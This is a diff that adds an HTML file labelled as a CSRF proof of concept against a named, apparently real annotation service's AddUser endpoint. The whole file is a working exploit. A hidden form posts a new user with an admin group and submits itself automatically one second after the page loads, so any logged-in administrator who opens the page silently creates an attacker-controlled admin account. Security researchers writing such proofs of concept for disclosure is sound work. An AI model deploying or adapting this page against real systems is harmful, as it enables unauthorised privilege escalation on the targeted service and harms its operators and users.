@@ -1,0 +1,21 @@
+<html>
+  <!-- CSRF PoC - nb1b3k -->
+  <body>
+    <form id="myForm" action="https://annotator.bii.a-star.edu.sg/annie/AddUser.do" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="login" value="testuserr" />
+      <input type="hidden" name="fullName" value="testuserr" />
+      <input type="hidden" name="passwd" value="testuserr" />
+      <input type="hidden" name="email" value="testuserpoc&#64;yopmail&#46;com" />
+      <input type="hidden" name="defaultGroup" value="bio:group:admin" />
+      <input type="hidden" name="submit" value="Add" />
+      <input type="submit" id="submitButton" value="Submit request" style="display: none;" />
+    </form>
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        setTimeout(function() {
+          document.getElementById('submitButton').click();
+        }, 1000); // 1000 milliseconds delay
+      });
+    </script>
+  </body>
+</html>
